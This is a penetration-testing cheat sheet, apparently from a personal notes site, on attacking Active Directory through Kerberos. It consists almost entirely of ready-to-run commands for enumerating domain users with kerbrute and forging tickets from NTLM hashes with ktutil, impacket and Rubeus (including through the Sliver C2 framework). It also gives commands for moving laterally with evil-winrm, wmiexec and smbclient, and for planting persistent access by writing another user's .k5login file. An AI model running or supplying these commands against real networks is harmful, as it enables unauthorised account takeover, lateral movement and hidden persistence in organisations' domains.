---
title: "Kerberos"
date: 2024-7-2
tags: ["kerberos", "kerbrute", "rubeus", "active directory", "ad", "domain controller", "Windows", "smb"]
---

### Users enum

{{< tab set1 tab1 active >}}kerbrute{{< /tab >}}
{{< tabcontent set1 tab1 >}}

```console
kerbrute userenum --domain <DOMAIN> --dc <DC> <USERNAMES_FILE>
```

<small>*Ref: [kerbrute](https://github.com/ropnop/kerbrute)*</small>

{{< /tabcontent >}}

### Usernames generator

{{< tab set2 tab1 active >}}username-anarchy{{< /tab >}}
{{< tabcontent set2 tab1 >}}

```console
./username-anarchy -i <USERS_FILE> | tee <USERNAMES_FILE>
```

<small>*Ref: [username-anarchy](https://github.com/urbanadventurer/username-anarchy)*</small>

{{< /tabcontent >}}

---

### Generate Kerberos ticket (From Linux)

{{< tab set3 tab1 active >}}Kinit{{< /tab >}}
{{< tab set3 tab2 >}}Impacket{{< /tab >}}
{{< tabcontent set3 tab1 >}}

#### 1. Set up

```console
# Step 0: Installation
sudo apt install krb5-user cifs-utils
```

```console
# Step 1: Add domain controller to '/etc/hosts' (Try different order if not work)
<TARGET> <DC> <DOMAIN>
```

```console
# Step 2: Add domain controller as a DNS server to '/etc/resolv.conf' [optional]
nameserver <TARGET>
```

```console
# Step 3: Edit '/etc/krb5.conf' (All uppercase)

[libdefaults]
    default_realm = <DOMAIN>

[realms]
    <DOMAIN> = {
        kdc = <DC>:88
        admin_server = <DC>
        default_domain = <DOMAIN>
    }
    
[domain_realm]
    .domain.internal = <DOMAIN>
    domain.internal = <DOMAIN>
```

```console
# Step 4: Sync time to domain controller
sudo ntpdate -s <DC>
```

#### 2a. With Password

```console
kinit <USER>
```

#### 2b. With NTLM hash

```console
ktutil
```

```console
add_entry -p <USER>@<DOMAIN> -k 1 -key -e rc4-hmac
```

```console
<HASH>
```

```console
write_kt <USER>.keytab
```

```console
exit
```

```console
kinit -V -k -t <USER>.keytab -f <USER>@<DOMAIN>
```

#### 3. Check ticket

```console
klist
```

{{< /tabcontent >}}
{{< tabcontent set3 tab2 >}}

```console
# With password
sudo ntpdate -s <DC> && impacket-getTGT '<DOMAIN>/<USER>'
```

```console
# With hash
sudo ntpdate -s <DC> && impacket-getTGT -hashes :<HASH> '<DOMAIN>/<USER>'
```

```console
# Import ticket
export KRB5CCNAME=<USER>.ccache
```

```console
# Check ticket
klist
```

{{< /tabcontent >}}

### Generate Kerberos ticket (From Windows)

{{< tab set4 tab1 active >}}rubeus{{< /tab >}}
{{< tabcontent set4 tab1 >}}

```console
# With password
.\rubeus.exe asktgt /user:<USER> /password:'<PASSWORD>' /enctype:AES256 /domain:<DOMAIN> /dc:<DC> /ptt /nowrap
```

```console
# With hash
.\rubeus.exe asktgt /user:<USER> /rc4:'<HASH>' /domain:<DOMAIN> /dc:<DC> /ptt /nowrap
```

```console
# Check
klist
```

{{< /tabcontent >}}

### Generate Kerberos ticket (From C2)

{{< tab set5 tab1 active >}}Sliver{{< /tab >}}
{{< tabcontent set5 tab1 >}}

```console
# With password
rubeus -- 'asktgt /user:<USER> /password:<PASSWORD> /enctype:AES256 /domain:<DOMAIN> /dc:<DC> /ptt /nowrap'
```

```console
# With hash
rubeus -- 'asktgt /user:<USER> /rc4:<HASH> /domain:<DOMAIN> /dc:<DC> /ptt /nowrap'
```

```console
# Check
c2tc-klist
```

{{< /tabcontent >}}

---


### Winrm with Kerberos

{{< tab set6 tab1 active >}}evil-winrm{{< /tab >}}
{{< tab set6 tab2 >}}wmiexec{{< /tab >}}
{{< tabcontent set6 tab1 >}}

```console
# Step 1: Edit '/etc/krb5.conf' (All uppercase)

[libdefaults]
    default_realm = <DOMAIN>

[realms]
    <DOMAIN> = {
        kdc = <DC>:88
        admin_server = <DC>
        default_domain = <DOMAIN>
    }
    
[domain_realm]
    .domain.internal = <DOMAIN>
    domain.internal = <DOMAIN>
```

```console
# Step 2: Connect
sudo ntpdate -s <DC> && evil-winrm -i <TARGET_DOMAIN> -r <DOMAIN>
```

{{< /tabcontent >}}
{{< tabcontent set6 tab2 >}}

```console
sudo ntpdate -s <DC> && impacket-wmiexec '<DOMAIN>/<USER>@<TARGET_DOMAIN>' -k -no-pass
```

{{< /tabcontent >}}

---

### Connect to SMB with Kerberos

```console
sudo ntpdate -s <DC> && impacket-smbclient '<DOMAIN>/<USER>@<TARGET_DOMAIN>' -k -no-pass
```

---

### Add Kerberos Access in Linux

```console
echo "<USER>@<DOMAIN>" > /home/<TARGET_USER>/.k5login
```
